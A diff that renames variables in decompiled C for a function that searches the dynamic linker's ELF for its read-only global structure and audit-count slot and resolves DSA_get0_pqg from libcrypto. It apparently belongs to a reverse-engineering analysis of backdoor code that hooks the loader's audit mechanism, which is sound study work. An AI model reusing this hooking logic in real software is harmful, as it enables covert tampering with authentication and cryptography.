@@ -37,29 +37,29 @@ BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
   u8 *scan_cursor;
   uint *glro_slot_ptr;
   u8 zero_seed;
-  EncodedStringId local_8c;
-  u64 local_88;
-  dasm_ctx_t local_80;
+  EncodedStringId glro_naudit_string_id;
+  u64 ldso_code_size;
+  dasm_ctx_t insn_ctx;
   
   zero_seed = 0;
-  local_8c = 0;
-  local_88 = 0;
+  glro_naudit_string_id = 0;
+  ldso_code_size = 0;
   pEVar5 = elf_symbol_get(dynamic_linker_elf,STR_rtld_global_ro,0);
   if (pEVar5 != (Elf64_Sym *)0x0) {
-    local_8c = STR_GLRO_dl_naudit_naudit;
-    str = elf_find_string(dynamic_linker_elf,&local_8c,(void *)0x0);
+    glro_naudit_string_id = STR_GLRO_dl_naudit_naudit;
+    str = elf_find_string(dynamic_linker_elf,&glro_naudit_string_id,(void *)0x0);
     if (str != (char *)0x0) {
       dsa_get0_pqg_symbol = elf_symbol_get(libcrypto_elf,STR_DSA_get0_pqg,0);
-      string_ref = (u8 *)elf_get_code_segment(dynamic_linker_elf,&local_88);
+      string_ref = (u8 *)elf_get_code_segment(dynamic_linker_elf,&ldso_code_size);
       if ((string_ref != (u8 *)0x0) &&
-         (string_ref = find_string_reference(string_ref,string_ref + local_88,str), string_ref != (u8 *)0x0)) {
+         (string_ref = find_string_reference(string_ref,string_ref + ldso_code_size,str), string_ref != (u8 *)0x0)) {
         if (dsa_get0_pqg_symbol != (Elf64_Sym *)0x0) {
           dsa_get0_pqg_value = dsa_get0_pqg_symbol->st_value;
           libcrypto_ehdr = libcrypto_elf->elfbase;
           imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
           imported_funcs->DSA_get0_pqg = (pfn_DSA_get0_pqg_t)(libcrypto_ehdr->e_ident + dsa_get0_pqg_value);
         }
-        dasm_cursor = &local_80;
+        dasm_cursor = &insn_ctx;
         for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
           *(undefined4 *)&dasm_cursor->instruction = 0;
           dasm_cursor = (dasm_ctx_t *)((long)dasm_cursor + (ulong)zero_seed * -8 + 4);
@@ -77,21 +77,21 @@ BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
         scan_cursor = string_ref + -0x80;
         while (scan_cursor < string_ref) {
           success = find_instruction_with_mem_operand_ex
-                            (scan_cursor,string_ref,&local_80,0x10b,(void *)0x0);
+                            (scan_cursor,string_ref,&insn_ctx,0x10b,(void *)0x0);
           scan_cursor = scan_cursor + 1;
           if (success != FALSE) {
-            if ((local_80.prefix.decoded.flags2 & 1) != 0) {
-              slot_ptr = (uint *)local_80.mem_disp;
-              if (((uint)local_80.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
-                slot_ptr = (uint *)((u8 *)(local_80.mem_disp + (long)local_80.instruction) +
-                                  local_80.instruction_size);
+            if ((insn_ctx.prefix.decoded.flags2 & 1) != 0) {
+              slot_ptr = (uint *)insn_ctx.mem_disp;
+              if (((uint)insn_ctx.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
+                slot_ptr = (uint *)((u8 *)(insn_ctx.mem_disp + (long)insn_ctx.instruction) +
+                                  insn_ctx.instruction_size);
               }
-              if (((((byte)local_80.prefix.decoded.rex & 0x48) != 0x48) && (rtld_global_ro_ptr < slot_ptr)) &&
+              if (((((byte)insn_ctx.prefix.decoded.rex & 0x48) != 0x48) && (rtld_global_ro_ptr < slot_ptr)) &&
                  (slot_ptr + 1 <= rtld_global_ro_ptr + rtld_global_ro_size)) {
                 glro_slot_ptr = slot_ptr;
               }
             }
-            scan_cursor = local_80.instruction + (ulong)local_80.insn_offset + 1;
+            scan_cursor = insn_ctx.instruction + (ulong)insn_ctx.insn_offset + 1;
           }
         }
         if ((glro_slot_ptr == (uint *)0x0) ||
